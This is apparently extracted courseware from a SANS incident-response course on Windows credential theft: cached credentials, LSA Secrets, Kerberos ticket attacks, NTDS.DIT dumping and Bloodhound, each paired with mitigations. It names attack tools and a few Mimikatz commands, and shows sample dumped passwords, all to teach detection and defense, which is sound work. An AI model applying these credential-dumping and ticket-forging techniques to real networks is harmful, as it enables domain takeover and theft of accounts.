[4] Analyzing “Account is sensitive and cannot be delegated”: http://for508.com/khltc
[5] TechNet Protected Users Security Group: http://for508.com/hm6po

140

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Compromising Credentials: Cached Credentials

Hashes
Tokens
Cached
Credentials
LSA Secrets
Tickets
NTDS.DIT

Stored domain credentials to allow logons when
domain controller access is unavailable. Most systems
cache the last 10 logon hashes by default.
How are they acquired and used? Cached
credentials must be cracked. Hashes are salted and
case-sensitive, making decryption very slow. These
hashes cannot be used for pass-the-hash attacks.
Common tools: cachedump • Metasploit
• PWDumpX • creddump • AceHash
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

141

.

In a domain environment, the domain controller (DC) is responsible for authenticating accounts. But what
happens if the system is offline or cannot communicate with the DC? To prevent a situation where a user cannot
log on to the system, Windows caches the last ten logon hashes by default (amazingly, this number was
increased to 25 for Server 2008).[1] Imagine how many accounts log on to the typical workstation. Probably less
than ten! Credentials can persist in this cache for very long periods. Attackers hope that at some time in the past,
a domain administrator (or similarly highly privileged account) logged on to the system interactively and had
their credentials stored indefinitely.
Cached domain credentials are stored in the Security registry hive in the SECURITY\Cache key. Administrator
(or System) privileges are required to access the saved hashes, which are in mscash2 format for modern
Windows operating systems. Since data is kept in the registry, these hashes persist indefinitely, even after a
reboot. The tool creddump can extract hashes offline, from exported registry hives. Mscash2 hashes are
encrypted and thus cannot be used in pass-the-hash attacks. They are also secured better than NT hashes,
including a hash salt of the username to defeat pre-computation attacks. Tools like John the Ripper and hashcat
can brute force crack these hashes, but with a good password policy in place, decryption can be very slow. Note
that some of the older hack tools in this category, notably cachedump and PWDumpX, appear to have problems
extracting cached credentials on systems post-WinXP.
[1] Cached and Stored Credentials Technical Overview: http://for508.com/bfwkn

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

141

Offline Cached Credentials Extraction (Creddump)
Local NT Hashes

Cached Hashes

The creddump utilities can extract hashes, cached credentials, and LSA Secrets from offline registry hives:
github.com/Neohapsis/creddump7
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we see two tools from the creddump suite being used to extract hashes and cached credentials
from offline registry hives. Offline credential extraction may be particularly interesting to attackers who are
wary of running common credential dumping binaries on a system. Instead of taking the risk of a security tool
identifying the binary, injection attempt, new service creation, or other artifacts left behind by malicious tools,
the attacker can simply copy the registry hives and extract credential data at a later time.
There are many offline credential extraction tools, including Mimikatz, which requires a process dump of
lsass.exe. Creddump is one of the more reliable tools available and is written in Python. Creddump was
originally created as a proof of concept by Brendan Dolan Gavitt and was subsequently updated and patched by
Ronnie Flathers.[1]
Of particular interest in this slide is the difference between dumping local hashes and cached credentials.
Pwdump.py was used to extract hashes from the SAM hive. These are local accounts that belong to this system.
Cachedump.py was subsequently used to extract cached credentials. These are potentially much more interesting
to an attacker since they are domain credentials and not subject to prevalent local account restrictions. There are
also several to choose from! Cached credentials are salted with the account username and thus must be cracked
via brute force. This tool nicely outputs them in the proper format to feed to the John the Ripper password
cracking tool (the format is named mscash2). While cached credentials certainly take longer for an attacker to
leverage, they have good potential to provide the highly privileged domain accounts that attackers seek.
[1] Creddump: http://for508.com/l-em1

142

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

142

.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

143

Defending Credentials: Cached Credentials

• Prevent admin account compromise
• Limit number of cached logon accounts
• SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon
(cachedlogonscount value)
• A cachedlogonscount of zero or one is not always the right answer

• Enforce password length and complexity rules
• Brute force cracking is required for this attack

• Domain Protected Users security group accounts do
not cache credentials
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Like many mitigations for credential access, preventing an attacker from achieving administrator permissions
removes their ability to retrieve cached credentials from the Security hive. Since this has thus far proven nearly
impossible in practice, other mitigations are worth exploring.

.

A common mitigation for this attack is to reduce the default number of cached logons in the registry key
SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon\. By default, Windows workstation operating
systems cache the last 10 logons and some servers cache up to 25.[1] US Department of Defense Security
Technical Implementation Guides (STIGS) commonly recommend this value be four or less.[2] Some
organizations set this value to zero or one (NSA recommended a value of zero for non-mobile XP systems). But
be careful when endorsing a very low number of cached credentials. The cachedlogonscount value is not only
for user accounts. Service accounts and computer account logons also get cached. Smart card usage can count as
two cached logons. If you set the value to one or zero, it may not cache the standard user account for offline use.
Microsoft began to address this threat starting with Windows 8.1. The introduction of the Protected Users
security group provides additional non-configurable credential protections. One of these protections is that
credentials are not cached for members of this group. The group is designed for high-value accounts and is a
significant step toward mitigating credential theft.
[1] Cached logons and CachedLogonsCount: http://for508.com/q09hg
[2] Domain Controller Security Technical Implementation Guide: http://for508.com/lwutc

144

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

144

Compromising Credentials: LSA Secrets

Hashes
Tokens
Cached
Credentials
LSA Secrets

Tickets
NTDS.DIT

Credentials stored in the registry to allow services or
tasks to be run with user privileges. In addition to
service accounts, may also hold application
passwords like VPN or auto-logon credentials.
How are they acquired and used? Administrator
privileges allow access to encrypted registry data and
the keys necessary to decrypt. Passwords are
plaintext.
Common tools: Cain • Metasploit • Mimikatz
• gsecdump • AceHash • creddump • PowerShell
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

145

.

Windows services are designed to run without user interaction and thus when they are executed using domain
accounts (as opposed to local built-in accounts like Local System, Network Service, and Local Service), the
password for that account must be stored somewhere. That somewhere is in the LSA Secrets key within the
Windows registry. Over the years, various applications (including Windows) have found it useful to store a wide
variety of different credentials in this “protected” area, including RAS and VPN passwords, default logon
credentials, credentials used to authenticate scheduled tasks, and even IIS application passwords. From an
attacker perspective, service accounts are by far the biggest draw, as they are very common in the Windows
enterprise, are often highly privileged, and rarely change.
LSA Secrets are stored in encrypted form in the Security hive registry key SECURITY/Policy/Secrets. Each
secret has its own key, and a parent key within SECURITY/Policy can decode the “secrets”. In addition to the
Security hive, dumping tools require access to the System hive to access a final decryption key. Administrator
privileges allow access to all of the registry areas necessary to dump the LSA Secrets. Once decrypted, all
passwords are in cleartext, making them particularly valuable for use with applications like RDP.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

145

Decrypting LSA Secrets (Nishang)

Get-LsaSecret.ps1 from the Nishang PowerShell pen
test framework used to dump (and decrypt) LSA
Secrets
https://github.com/samratashok/nishang
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

LSA Secrets are stored in encrypted form within the Registry. However, the keys are available with admin
rights, and the format and locations of the data are well documented. There are many tools that have been
developed over the years to exploit LSA Secrets. While any pen tester will tell you that the data stored can often
be very boring, once in a while an attacker hits the lottery and finds a domain admin service password nicely in
plaintext.
This example shows an interesting update to the wealth of LSA Secret dumping tools—implementation coded as
a PowerShell script. The Nishang framework is designed for offensive security operations and contains many
different scripts for attacking systems. Here we see the Get-LsaSecret script being used to dump the registry
data. Note that this particular script requires an administrator 32-bit PowerShell console (which is available on
every modern Windows OS). The script run prior to this one, Enable-DuplicateToken, is also part of Nishang
and is required to gain permissions necessary to access the Security registry hive. It works by setting the current
process thread token to the same token currently in use by the LSASS process (very clever).
The output on this slide represents exactly what an adversary hopes to find—a domain service account (sqlservice) and password (sq!@dmsq!@dm). If this account ends up having domain admin privileges, the attacker
is well on their way to owning the enterprise. Note that most of the credential attacks discussed in this section
show that password complexity is rarely enough to prevent compromise. This example demonstrates this, as the
sql-service password is 12 characters and relatively complex. The “DefaultPassword” value is used when autologin is enabled on the system. The value “ROOT#123” is a common default on Windows servers for this
feature and likely means that auto-login is not in use for this system (it is rarely in use in an enterprise). The
non-printable characters shown for $MACHINE.ACC and NL$KM are actually strings of hex values stored for
those “secrets”. They are not passwords.

146

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

146

Defending Credentials: LSA Secrets

• Prevent admin account compromise
• Do not employ services or schedule tasks
requiring privileged accounts on low-trust systems
• Reduce number of services that require domain
accounts to execute
• Heavily audit any accounts that must be used

• (Group) Managed Service Accounts
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

147

.

The best option for mitigating LSA Secrets attacks is ensuring low-trust systems do not have services or
scheduled tasks present that require highly privileged, non-built-in accounts. When this situation occurs, those
privileged accounts must be stored in the LSA Secrets registry key, making them available to any attacker with
admin rights on the system. The use of these service accounts and tasks can creep into an organization and are
pernicious to the environment once a compromise occurs.
Auditors should report on the existence of services or tasks that rely upon domain accounts, and infrastructure
changes often must be made in order to reduce the reliance on these very dangerous implementations. If a
vendor requires the use of a highly privileged service account, you should force them to implement a new
solution or look for other options.
Since it can be very difficult to totally remove the reliance on LSA Secrets, any accounts that are likely to be
present in this key should follow the least privilege rule and be heavily audited.
Managed Service Accounts were released with Server 2008R2. This feature specifically helps with service
accounts being run with domain user rights. It provides both frequent password changes (30 days by default) and
long and complex passwords for these accounts. While an excellent idea, the initial implementation was lacking.
The latest iteration, Group Managed Service Accounts, is much more flexible and admin-friendly.[1]
[1] Avoid password management with Group Managed Service Accounts: http://for508.com/80l56

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

147

Compromising Credentials: Tickets

Hashes
Tokens
Cached
Credentials
LSA Secrets

Tickets
NTDS.DIT

Kerberos issues tickets to authenticated users that can be
reused without additional authentication. Tickets are
cached in memory and are valid for 10 hours.
How are they acquired and used? Tickets can be
stolen from memory and used to authenticate elsewhere
(Pass the Ticket). Further, access to the DC allows tickets
to be created for any user with no expiration (Golden
Ticket). Service account tickets can be requested and
forged, including offline cracking of service account hashes
(Kerberoasting).
Common tools: Mimikatz • WCE • kerberoast
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The Windows enterprise relies heavily on the Kerberos authentication protocol. This protocol uses Ticket
Granting Tickets (TGTs) to prove successful authentication of user accounts and service tickets to authenticate
for particular services. Since nearly everything in Windows is tied to an account, the authentication burden can
be massive. To reduce the number of authentication requests that bombard a domain controller (DC), issued
tickets are valid for 10 hours by default. This means that anyone in possession of that ticket is already preauthenticated during that time period. Attackers can use tickets to impersonate privileged users, evade the
authentication process, and reduce logging of their efforts. Attack details will be covered in an upcoming slide.

148

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

148

Pass the Ticket (Mimikatz)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

149

.

In this example, the attacker previously dumped available tickets using the Mimikatz option “sekurlsa::tickets
/export”. This writes each ticket out to a file, which can then be subsequently moved and imported to wherever
it will be useful. The Mimikatz “kerberos::ptt” option is seen here importing a ticket for a domain admin user
named “rsydow”. After importation, the built-in Windows command “klist” is used to show that the desired
ticket is cached on the system and available to authenticate throughout the environment.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

149

.
150

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Kerberos Attacks
Pass the Ticket

Steal ticket from memory and pass or import on other systems

Overpass the Hash

Use NT hash to request a service ticket for the same account

Kerberoasting

Request service ticket for highly privileged service and crack
NT hash

Golden Ticket

Kerberos TGT for any account with no expiration. Survives full
password reset

Silver Ticket

All-access pass for a single service or computer

Skeleton Key

Patch LSASS on domain controller to add backdoor password
that works for any domain account

DCSync

Use fake Domain Controller replication to retrieve hashes
(and hash history) for any account without login to the DC
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

151

.

Pass the Ticket
Ticket attacks are not new, but recent improvements in tools have made them easier to steal and employ. Tickets
are cached in memory during the time they are valid, and a tool like Mimikatz allows an attacker with
administrator privileges to dump all of the tickets present on the system to individual files. They can then pass
them to other systems to authenticate as that account (TGT) or service. Tickets can also just be imported into
other systems, allowing a user “transplant” without requiring any knowledge of the user hash or password.[1]
Overpass the Hash (Pass the Key)
If an attacker can dump an account hash from the system, this hash can be used to request service tickets,
providing access to other system resources (like file shares). While similar to pass the hash, the attack employs
Kerberos for authentication (instead of NTLM), meaning it can work even when pass-the-hash mitigations are in
place (like limiting NTLM authentication over the network).
Kerberoasting
Interestingly, any domain user can request a ticket from the Domain Controller for any domain service. The
ticket returned for such a request has a non-salted password hash for the account that runs that service. Attackers
can seek tickets for services being run under the context of a domain user (or even better domain admin)
accounts and can derive the plaintext account password. The encrypted hash can be cracked offline, all without
any failed logon attempts or account lockouts! Since service account passwords often have high privileges and
are rarely changed, these passwords can be very valuable.
Golden Ticket
A “Golden Ticket” is a method of creating Kerberos TGT authentication tickets that do not expire (Mimikatz
sets the default expiration to 10 years, but this can be increased). Golden Tickets can be created for any account,
and are commonly used to create a persistent domain administrator TGT that will work even after a full
password reset of the enterprise.[2] This attack gives an adversary an unprecedented level of persistence. If an
attacker loses access, all that is required is user-level access on any system and the previously generated Golden
Ticket can be re-introduced to elevate to domain administrator again using the Pass the Ticket attack. There are
few Windows logging events that can track the use of a Golden Ticket.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

151

To create a Golden Ticket, the attacker must first achieve administrator credentials on the domain controller.
They can then extract the hash for the krbtgt account, the account used to create tickets. The hash can be
extracted from the DC memory, or via the theft of the NTDS.DIT active directory database. After that is
accomplished, the creation of the ticket can be accomplished offline at the attacker’s leisure.
Silver Ticket
By dumping the computer account hash from memory, an attacker can create a “Silver Ticket” for that system.
Think of a Silver Ticket as an all-access pass for a single service or computer. This attack forges a service ticket
using a dumped computer account hash, and can (usually) impersonate any user for that system, including
domain admin. They also become excellent backdoors, since authentication occurs without requiring
communication with the Domain Controller (minimizing log evidence). Computer account passwords are
supposed to be changed every 30 days but don’t always get changed. Attackers have also been known to turn off
password updates on systems to ensure Silver Tickets work indefinitely. Having a computer's NT hash (trivial to
access with a combination of NTLMv1 and the PrinterBug exploit) means you can make a service ticket with
any user/group memberships you want for that computer. You can be anyone up to and including Domain
Admin.
Skeleton Key
Once an attacker has access to the Domain Controller, a tool like Mimikatz (or other malware found in the wild)
can patch LSASS to enable a backdoor password for any valid domain user. A user’s actual password can still
be used to authenticate, but accounts will also authenticate with the “skeleton key” backdoor password, even
after a user changes their password. This attack provides an easy and persistent way to abuse accounts
throughout the active directory environment.

.

DCSync
Domain controllers (DC) frequently communicate with one another, synchronizing and updating data using the
protocol MS-DRSR (Directory Replication Service Remote Protocol). Security researchers Benjamin Delpy and
Vincent Le Toux discovered multiple ways to abuse this protocol, including the ability to impersonate a DC and
send a “sync” request to a legitimate DC for the password hash (and hash history) of an account of their
choosing. The requested account can even be the KRBTGT ticket necessary to create Golden Tickets! This
attack requires high level privileges -- directory replication rights that often come by default as a member of the
Administrators, Domain Administrator, or Domain Controllers Group. A significant advantage of DCSync is it
works remotely without requiring an interactive logon with the DC. Another attack was subsequently released,
DCShadow, using the same protocol to inject data into the Active Directory infrastructure to maintain
persistence or setup more advanced attacks.
[1] Protecting Windows Networks – Kerberos Attacks: http://for508.com/l-zh8
[2] Protection from Kerberos Golden Ticket (PDF): http://for508.com/i3-4q

152

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Defending Credentials: Tickets

• Credential Guard (Win10+)
• Domain Protected Users Group (Win8+): Some attacks

• Remote Credential Guard (Win10+)
• Restricted Admin (Win8+)

• Long and complex passwords on service accounts
• Change service account passwords regularly
• Group Managed Service Accounts are a great mitigation

• Audit service accounts for unusual activity
• Limit and protect Domain Admin
• Change KRBTGT password regularly (yearly)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

153

Ticket-based attacks are one of the most difficult credential issues to detect and mitigate because most ticket
attacks use valid “features” of Kerberos. Tickets can remain valid for some time, even after a password change
occurs, and since tickets are generated after multifactor authentication is employed, that control is effectively
bypassed as well. It wasn’t until Windows 10 and Server 2016 that any real mitigations were available.

.

Credential Guard in Windows 10+ uses virtual machine isolation to prevent access to a user’s hashes and tickets.
This prevents even an admin user from dumping tickets to use for attacks like pass the ticket and/or dumping
hashes to use for overpassing the hash (AKA Pass the Key) attacks. It is solid protection and an excellent reason
to migrate the enterprise to Windows 10+. The Domain Protected Users security group that debuted in Windows
8.1 can prevent attacks like overpass the hash since it eliminates the ability to use the legacy RC4 encryption
scheme. Tickets also have a shorter lifespan (4 hours) by default, but pass the ticket attacks cannot be
completely prevented since the user’s ticket must still be present in memory.
Remote Credential Guard and Restricted Admin are helpful in mitigating the threat since user credentials are not
passed to remote systems, even during interactive sessions like RDP. Thus, tickets for high-value accounts
cannot be stolen from remote systems when these options are enabled. This helps prevent pass the ticket attacks.
Even with Credential Guard and Remote Credential Guard, there is still one gaping hole in Kerberos security.
While user account tickets are very well protected with these new features, service tickets can still be abused.
One demonstrated attack against Remote Credential Guard is to use the current user’s token to request arbitrary
service account tickets from the Domain Controller, which can then be used to authenticate over the network.[1]
A similar attack uses the fact that any domain user can request a ticket from the Domain Controller for any
domain service. The ticket has a password hash for the account that runs that service and attackers seek tickets
that are being run under the context of domain user (or even better, domain admin) accounts. The hash can then
be cracked offline (Kerberoasting).[2] Since Kerberoasting is an offline cracking attack, it does not result in
failed logins. The best defense against these types of attacks is to change service account passwords regularly
and use long and complex passwords. The former reduces the lifespan of attacker-collected tickets, and the latter
effectively prevents Kerberoasting. A feature first released with Server 2008R2, Managed Service Accounts, is
the ideal option since it automatically changes service account passwords every 30 days and uses very large and
complex passwords. However, none of these actions can completely prevent service ticket abuse. It is still
critical that defenders actively monitor service accounts with high privileges for anomalous activity.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

153

The Golden Ticket attack is particularly difficult to identify and mitigate. One way to detect it is to look for
invalid accounts being used in the enterprise (though a Golden Ticket can also be created for a valid account).
To defeat a Golden Ticket, the krbtgt account password used by the DC to create tickets must be changed
(twice).[3] Some organizations are preemptively changing this password on a regular basis to kill any Golden
Tickets currently in use.

.

[1] Exploring the limitations of Remote Credential Guard: http://for508.com/90fi6
[2] GitHub kerberoast: http://for508.com/5acrs
[3] Kerberos in the Crosshairs: Golden Tickets, Silver Tickets, MITM, and More: http://for508.com/2d0ho

154

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Kerberos Attack Mitigations
Attack Type

Description

Mitigation

Pass the Ticket

Steal ticket from memory and pass or
import on other systems

Credential Guard; Remote Credential
Guard

Overpass the
Hash

Use NT hash to request a service ticket for
the same account

Credential Guard; Protected Users Group;
disable RC4 authentication

Kerberoasting

Request service ticket for highly
privileged service and crack NT hash

Long and complex service account
passwords; Managed Service Accounts

Golden Ticket

Kerberos TGT for any account with no
expiration. Survives full password reset

Protect domain admin accounts; change
KRBTGT password regularly

Silver Ticket

All-access pass for a single service or
computer

Regular computer account password
updates

Skeleton Key

Patch LSASS on domain controller to add
backdoor password to any account

Protect domain admin accounts; smart
card usage for privileged accounts

DCSync

Use false DC replication to obtain hashes

Protect domain admin; audit/limit
accounts with replication rights

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

155

The following actions are common mitigation for Kerberos and ticket attacks:
• Pass the Ticket: Credential Guard, Remote Credential Guard

.

• Overpass the Hash (Pass the Key): Credential Guard; Protected Users Group; disable RC4 authentication
• Kerberoasting: Long and complex service account passwords; Managed Service Accounts
• Golden Ticket: Protect domain admin accounts; change KRBTGT password regularly
• Silver Ticket: Regular computer account password updates
• Skeleton Key: Protect domain admin accounts; smart card usage for privileged accounts
• DCSync: Protect domain admin; audit/limit accounts with replication rights

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

155

Compromising Credentials: NTDS.DIT

Hashes
Tokens
Cached
Credentials
LSA Secrets
Tickets
NTDS.DIT

Active Directory Domain Services (AD DS) database holds
all user and computer account hashes (LM/NT) in the
domain. Encrypted, but algorithm is well-known and easy
to defeat.
How is it acquired and used? Located by default in the
\Windows\NTDS folder on the domain controller. The
file is locked, so admin access is required to load a driver to
access raw disk or use the Volume Shadow Copy Service.
Common tools: ntdsutil • VSSAdmin • NTDSXtract •
MetaSploit • PowerShell • secretsdump.py

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The domain controller is usually one of the first places attackers traverse to after achieving domain administrator
credentials. And a primary objective is the NTDS.DIT file. This database has the “keys to the kingdom” and can
provide access to nearly every resource in the domain, including those special accounts protecting resources
even domain administrators can’t access. Account hashes are in NT format (and possibly LM for older systems)
and hashes for each account’s password history are also present (excellent for taking advantage of password
reuse elsewhere).
The NTDS.DIT database is in the well-known Extensible Storage Engine (ESE) format and is located by default
in the %SystemRoot%\NTDS folder. While rare, the location of this file can be changed from the default with
the registry key HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters recording the new location. It
is a locked and protected file, so it cannot be copied via ordinary means. The most common ways to extract the
file include using a built-in tool like ntdsutil, loading a driver or tool that gives raw access to the disk (evading
Windows API protections), or using the built-in Volume Shadow Copy service. Whatever the technique, admin
privileges are required on the domain controller, which is at least a small hurdle.
The Volume Shadow Copy extraction technique requires no extra files and is currently the most popular choice
in the wild. If there are no Volume Shadow Copies on the system, an attacker can simply create one! The SAM
and SYSTEM registry hives must also be collected from the domain controller to facilitate decrypting the data
within the database. Once the files are collected, offline extraction can be accomplished using a variety of opensource tools. One of the most famous is the Impacket secretsdump.py script.[1] The result is every NT hash in
the domain, which can then be cracked or used immediately via pass-the-hash attacks.
It goes without saying that this attack is by far the most dangerous and devastating that can be accomplished in
the enterprise. Retrieving data from the NTDS.DIT requires administrative access to a domain controller (DC).
In most cases, if an attacker has achieved this level of access, they are well on their way to owning the entire
enterprise. It also opens up attacks like Golden Tickets. Thus, the most relevant mitigation is to detect and stop
adversaries before they gain access to the DC.
[1] GitHub impacket/secretsdump.py: https://for508.com/p1xl-

156

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

156

Finding a Path to Domain Admin: Bloodhound
• Bloodhound is an Active Directory relationship graphing tool
• Nodes: Users, Computers, Groups, Domains, OUs, GPOs
• Edges: MemberOf, HasSession, AdminTo, TrustedBy, …
• Paths: A list of nodes connected by edges (Path to Domain Admin)

• Bloodhound is an audit tool as much as an attack tool
• Helps visualize dangerous trust relationships and misconfigurations
• Significantly reduces the brute-force effort required to find domain admin

• Very difficult to detect, though tools like GoFetch are very noisy
Group:
Domain
Admins

Group:
Wkstn
Admins
User:
Bob

System:
RD-03

User:
Alice

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

157

.

Bloodhound takes advantage of the security maxim posited by John Lambert of Microsoft: “Defenders think in
lists. Attackers think in graphs. As long as this is true, attackers win.” It is an automated tool designed to use
“graph theory to reveal the hidden and often unintended relationships within an Active Directory environment.”
[1] Active Directory is immensely complex and tends to gain more complexity as a network evolves. It can be
extremely difficult to visualize the consequences of the myriad changes that occur to groups, domains,
organization units (OUs), and group policy objects (GPOs) that ultimately affect the trust model. This is why
Bloodhound should be considered as much of a blue team (defensive) tool as a red team (attack) tool. Ideally it
should be proactively employed in an enterprise by defenders or pen test teams before an attacker gains access
to do the same thing. Seeing Bloodhound in action can send a chill down the spine as it effortlessly identifies
paths to your most sensitive groups and accounts. The simplified graph shown on this slide is not far off from
what can be found on many networks. Because Bloodhound can identify users, groups, and where those users
currently have sessions, it presents a step-by-step path of where to dump credentials and where to laterally move
next.
Unfortunately, the use of Bloodhound in most environments is very stealthy. To collect data, it uses LDAP
requests which are very common in the enterprise. Older versions could sometimes be discovered via Active
Directory logs by identifying many near-simultaneous LDAP sessions, but the latest versions of Sharphound
(the Bloodhound collector) use cached LDAP connections, limiting the footprint. Attempts have been made to
detect it using netflow logs (tracking LDAP sessions), auditing of Directory Service Access in AD logs, and
employing honey tokens. EDR tools can potentially use connections to objects like specific named pipes or
other behavioral clues. However, just like most of the credential attacks discussed in this section, often the most
reliable detection is inappropriate use after credential theft occurs. As great examples, there are multiple
automation tools that attempt to automate the tasks required to achieve Domain Admin rights, such as GoFetch
and DeathStar; these tools can be very noisy.[2,3] GoFetch takes the Bloodhood graph and uses Invoke-Mimikatz
and Invoke-Psexec to automate credential theft and lateral movement. Similarly, DeathStar uses PowerShell
Empire to enumerate accounts (approximating Bloodhound), perform credential theft, and automate lateral
movement. Both methods leave behind a tremendous number of artifacts that we will develop detection
capabilities for throughout the next section.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

157

.

[1] GitHub - BloodHound: https://for508.com/hfi9o
[2] Automating the Empire with the Death Star: getting Domain Admin with a push of a button:
https://for508.com/2riwf
[3] GitHub - GoFetch: https://for508.com/xdt0p

158

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics 159

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

159

COURSE RESOURCES AND CONTACT INFORMATION
Here is my lens. You know my methods. –Sherlock Holmes
AUTHOR CONTACT
rlee@sans.org
http://twitter.com/robtlee

SANS INSTITUTE
11200 Rockville Pike, Suite 200
N. Bethesda, MD 20852
301.654.SANS(7267)

ctilbury@sans.org
http://twitter.com/chadtilbury
mpilkington@sans.org
https://twitter.com/mikepilkington

SANS EMAIL
DFIR RESOURCES
digital-forensics.sans.org
Twitter: @sansforensics

GENERAL INQUIRIES: info@sans.org
REGISTRATION: registration@sans.org
TUITION: tuition@sans.org
PRESS/PR: press@sans.org

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

160

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

160

FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

508.2

.

Intrusion Analysis

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
